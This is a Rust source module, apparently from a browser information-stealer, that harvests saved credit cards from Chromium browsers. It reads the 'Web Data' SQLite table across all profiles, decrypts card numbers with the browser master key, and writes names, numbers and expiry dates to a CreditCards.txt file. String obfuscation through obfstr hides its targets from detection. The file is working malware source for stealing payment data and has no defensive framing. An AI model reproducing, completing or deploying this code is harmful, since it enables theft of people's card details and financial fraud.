use alloc::boxed::Box;
use sqlite::{TableRecord, TableRecordExtension};
use crate::alloc::borrow::ToOwned;
use alloc::sync::Arc;
use alloc::vec::Vec;
use tasks::{parent_name, Task};
use utils::path::Path;
use crate::chromium::Browser;
use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, CreditCard};
use obfstr::obfstr as s;
use utils::browsers::chromium::decrypt_data;

const CREDIT_CARDS_NAME_ON_CARD: usize = 1;
const CREDIT_CARDS_EXPIRATION_MONTH: usize = 2;
const CREDIT_CARDS_EXPIRATION_YEAR: usize = 3;
const CREDIT_CARDS_CARD_NUMBER: usize = 4;
const CREDIT_CARDS_USE_COUNT: usize = 7;

pub(super) struct CreditCardsTask {
    browser: Arc<Browser>
}

impl CreditCardsTask {
    pub(super) fn new(browser: Arc<Browser>) -> Self {
        Self { browser }
    }
}

impl Task for CreditCardsTask {
    parent_name!("CreditCards.txt");
    
    unsafe fn run(&self, parent: &Path) {
        let Some(mut credit_cards) = collect_from_all_profiles(
            &self.browser.profiles,
            |profile| read_credit_cards(profile, &self.browser.master_key)
        ) else {
            return
        };
        
        credit_cards.sort_by(|a, b| b.use_count.cmp(&a.use_count));
        
        let _ = to_string_and_write_all(&credit_cards, "\n\n", parent);
    }
}

fn read_credit_cards(profile: &Path, master_key: &[u8]) -> Option<Vec<CreditCard>> {
    let web_data_path = profile / s!("Web Data");
    
    read_sqlite3_and_map_records(
        &web_data_path,
        s!("Credit_cards"),
        |record| extract_card_from_record(record, master_key)
    )
}

fn extract_card_from_record(record: &Box<dyn TableRecord>, master_key: &[u8]) -> Option<CreditCard> {
    let name_on_card = record.get_value(CREDIT_CARDS_NAME_ON_CARD)?.as_string()?.to_owned();
    let expiration_month = record.get_value(CREDIT_CARDS_EXPIRATION_MONTH)?.as_integer()?;
    let expiration_year = record.get_value(CREDIT_CARDS_EXPIRATION_YEAR)?.as_integer()?;
    let use_count = record.get_value(CREDIT_CARDS_USE_COUNT)?.as_integer()?;
    
    let encrypted_card_number = record.get_value(CREDIT_CARDS_CARD_NUMBER)?.as_blob()?;
    let card_number = unsafe { decrypt_data(encrypted_card_number, master_key) }?;
    
    Some(CreditCard {
        name_on_card,
        expiration_month,
        expiration_year,
        card_number,
        use_count
    })
}